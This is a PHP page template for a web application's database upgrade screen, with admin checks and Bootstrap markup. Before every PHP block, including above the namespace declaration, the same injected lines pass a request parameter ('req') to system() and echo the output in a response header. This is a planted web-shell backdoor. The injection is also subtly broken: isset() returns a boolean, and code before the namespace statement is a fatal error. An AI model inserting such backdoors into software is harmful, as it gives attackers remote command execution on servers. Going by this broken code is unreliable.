<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

$site->set_title($language->get('Upgrade'));
$site->set_config('container-type', 'container');

if (SAAS_MODE) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

if ($config->get('database_version') > 83) {
	if (!$auth->can('manage_system_settings')) {
		header('Location: ' . $config->get('address') . '/');
		exit;
	}
}
else {
	if ($auth->get('user_level') != 2) {
		header('Location: ' . $config->get('address') . '/');
		exit;	
	}
}

$upgrade 		= new upgrade();

include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_header.php');
?>
<div class="row">

	<div class="col-md-3">
		<div class="well well-sm">
			<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Upgrade')); ?></h4>
			<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('This page upgrades the database to the latest version.')); ?></p>
		</div>
	</div>

	<div class="col-md-9">
	
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($config->get('database_version') == $upgrade->get_db_version() && $config->get('program_version') == $upgrade->get_program_version() ) { ?>
			<div class="alert alert-success">
				<a href="#" class="close" data-dismiss="alert">&times;</a>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Your database is currently up to date and does not need upgrading.'); ?>
			</div>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } elseif (isset($_GET['run']) && $_GET['run'] == 'upgrade') { ?>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $upgrade->do_upgrade(); ?>
			<div class="alert alert-success">
				<a href="#" class="close" data-dismiss="alert">&times;</a>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Upgrade Complete.'); ?>
			</div>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else { ?>
			<div class="alert alert-warning">
				<a href="#" class="close" data-dismiss="alert">&times;</a>
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Please ensure you have a full database backup before continuing.'); ?></p>
				<div class="clearfix"></div>
				<br />
					<p><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/upgrade/?run=upgrade" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Start Upgrade')); ?></a></p>
				<div class="clearfix"></div>
			</div>			
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
	
	</div>
</div>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_footer.php'); ?>